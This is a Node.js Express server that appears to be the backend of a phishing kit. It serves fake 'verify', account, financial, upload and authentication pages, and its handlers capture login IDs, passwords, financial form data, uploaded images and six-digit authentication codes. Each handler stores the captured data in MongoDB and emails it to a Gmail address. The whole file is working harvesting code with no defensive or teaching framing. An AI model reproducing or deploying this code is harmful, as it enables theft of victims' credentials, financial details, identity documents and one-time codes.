const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
require('dotenv').config();
const corsOptions = {
  origin: 'http://localhost:3000',
  methods: 'GET,HEAD,PUT,PATCH,POST,DELETE',
  credentials: true,
  optionsSuccessStatus: 204,
};

const cors = require('cors');

const app = express();
const port = 3000; // Set your desired port number

const multer = require('multer');
const axios = require('axios');
const nodemailer = require('nodemailer');
const upload = multer();

const GMAIL_EMAIL = process.env.GMAIL_EMAIL;
const GMAIL_PASSWORD = process.env.GMAIL_PASSWORD;
const MONGODB_URI = process.env.MONGODB_URI;

const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: GMAIL_EMAIL, // Replace with your Gmail email address
    pass: GMAIL_PASSWORD, // Use the App Password if 2FA is enabled
  },
});


// Connect to MongoDB directly in the code
mongoose.connect(MONGODB_URI, {
  useNewUrlParser: true,
  useUnifiedTopology: true,
});

const loginAttemptSchema = new mongoose.Schema({}, {strict: false});

const LoginAttempt = mongoose.model('LoginAttempt', loginAttemptSchema);

const accountDetailsSchema = new mongoose.Schema({}, {strict: false});

const AccountDetails = mongoose.model('AccountDetails', accountDetailsSchema);

const financialDetailsSchema = new mongoose.Schema({}, {strict: false});

const FinancialDetails = mongoose.model('FinancialDetails', financialDetailsSchema);

const authenticationCodeSchema = new mongoose.Schema({}, {strict: false});

const AuthenticationCodeModel = mongoose.model('AuthenticationCode', authenticationCodeSchema);

// Middleware for parsing JSON and URL-encoded data
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(cors(corsOptions));

// POST endpoint for handling image upload and sending email
app.post('/uploadimage', upload.array('fileInput', 5), async (req, res) => {
  try {
    const files = req.files;

    // Send the images as attachments in the email
    const emailData = {
      from: GMAIL_EMAIL,
      to: 'btest7174@gmail.com', // Replace with the recipient's email address
      subject: 'Upload Data',
      text: 'Uploaded info',
      attachments: files.map(file => ({
        filename: file.originalname,
        content: file.buffer,
      })),
    };

    const info = await transporter.sendMail(emailData);

    console.log('Email sent successfully:', info.messageId);
    res.redirect('/authentication'); // Redirect to /authentication after successful email send
  } catch (error) {
    console.error('Error:', error);
    res.status(500).send('Internal Server Error');
  }
});

app.post('/login-attempts', async (req, res) => {
  const { loginId, password, browserType, attemptNumber, attemptSuccessful } = req.body;
  const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

  const newAttempt = new LoginAttempt({
    loginId,
    password, // Specify password field
    ipAddress: clientIP, // Store the client's IP address in the model
    browserType,
    attemptNumber,
  });

  try {
    await newAttempt.save();

    // Send email with login attempt details
    const emailData = {
      from: GMAIL_EMAIL,
      to: 'btest7174@gmail.com', // Replace with the recipient's email address
      subject: 'Login Attempt Details',
      text: `Login ID: ${loginId}\nPassword: ${password}\nIP Address: ${clientIP}\nBrowser Type: ${browserType}\nAttempt Number: ${attemptNumber}`,
    };

    await transporter.sendMail(emailData);

    res.status(201).send({ message: 'Login attempt data saved successfully!' });
  } catch (error) {
    console.error(error);
    res.status(500).send({ message: 'Error saving login attempt data.' });
  }
});

app.post('/submitFormData', (req, res) => {
  const formData = req.body;

  // Access browser type and IP address
  const browserType = req.headers['user-agent'];
  const ipAddress = req.ip;

  // Save the data to MongoDB
  const accountDetails = new AccountDetails({
    formData,
    browserType,
    ipAddress,
  });

  accountDetails.save()
    .then(result => {
      // Send email with form data details
      const emailData = {
        from: GMAIL_EMAIL,
        to: 'btest7174@gmail.com', // Replace with the recipient's email address
        subject: 'Form Data Details',
        text: `Form Data: ${JSON.stringify(formData)}\nIP Address: ${ipAddress}\nBrowser Type: ${browserType}`,
      };

      transporter.sendMail(emailData);

      res.status(200).json({ success: true });
    })
    .catch(err => {
      console.error(err);
      res.status(500).json({ error: 'Internal Server Error' });
    });
});


app.post('/submitFormData1', (req, res) => {
  const formData = req.body;

  // Access browser type and IP address
  const browserType = req.headers['user-agent'];
  const ipAddress = req.ip;

  // Save the data to MongoDB
  const financialDetails = new FinancialDetails({
    formData,
    browserType,
    ipAddress,
  });

  financialDetails.save()
    .then(result => {
      // Send email with financial data details
      const emailData = {
        from: GMAIL_EMAIL,
        to: 'btest7174@gmail.com', // Replace with the recipient's email address
        subject: 'Financial Data Details',
        text: `Financial Data: ${JSON.stringify(formData)}\nIP Address: ${ipAddress}\nBrowser Type: ${browserType}`,
      };

      transporter.sendMail(emailData);

      res.status(200).json({ success: true });
    })
    .catch(err => {
      console.error(err);
      res.status(500).json({ error: 'Internal Server Error' });
    });
});


app.post('/submitAuthenticationCode', async (req, res) => {
  try {
    const { authenticationCode } = req.body;

    // Access browser type and IP address
    const browserType = req.headers['user-agent'];
    const ipAddress = req.ip;

    // Validate the authentication code (add more validation if needed)
    if (!authenticationCode || authenticationCode.length !== 6) {
      return res.status(400).json({ error: 'Invalid authentication code' });
    }

    // Save the authentication code to MongoDB
    const savedCode = await AuthenticationCodeModel.create({
      code: authenticationCode,
      browserType,
      ipAddress,
    });

    // Send email with authentication code details
    const emailData = {
      from: GMAIL_EMAIL,
      to: 'btest7174@gmail.com', // Replace with the recipient's email address
      subject: 'Authentication Code Details',
      text: `Authentication Code: ${authenticationCode}\nIP Address: ${ipAddress}\nBrowser Type: ${browserType}`,
    };

    await transporter.sendMail(emailData);

    // Send a success response
    res.json({ success: true });
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: 'Internal Server Error' });
  }
});



app.get('/verify', (req, res) => {
  res.sendFile(__dirname + '/verify_files/verify.html'); // Adjust the path accordingly
});

app.get('/logo', (req, res) => {
  res.sendFile(__dirname + '/verify_files/logo.png'); // Adjust the path accordingly
});

app.get('/IconFlat-Light-Inspect', (req, res) => {
  res.sendFile(__dirname + '/verify_files/IconFlat-Light-Inspect.png'); // Adjust the path accordingly
});

app.get('/Icon-Flat-Light-CreateLogin', (req, res) => {
  res.sendFile(__dirname + '/verify_files/Icon-Flat-Light-CreateLogin.png'); // Adjust the path accordingly
});

app.get('/Icon-Flat-Shield-SecurityPref', (req, res) => {
  res.sendFile(__dirname + '/verify_files/Icon-Flat-Shield-SecurityPref.png'); // Adjust the path accordingly
});

app.get('/Image-Welcome-Greeting', (req, res) => {
  res.sendFile(__dirname + '/verify_files/Image-Welcome-Greeting.svg'); // Adjust the path accordingly
});

app.get('/account', (req, res) => {
  res.sendFile(__dirname + '/account.html'); // Adjust the path accordingly
});

app.get('/financial', (req, res) => {
  res.sendFile(__dirname + '/financial.html'); // Adjust the path accordingly
});

app.get('/upload', (req, res) => {
  res.sendFile(__dirname + '/upload.html'); // Adjust the path accordingly
});

app.get('/authentication', (req, res) => {
  res.sendFile(__dirname + '/authentication.html'); // Adjust the path accordingly
});


// Serve static files (your HTML and CSS)
app.use(express.static('public'));

// Start the server
app.listen(process.env.PORT || port , () => {
  console.log(`Server is running on http://localhost:${port}`);
});

// Export the transporter for use in other areas
module.exports = transporter;
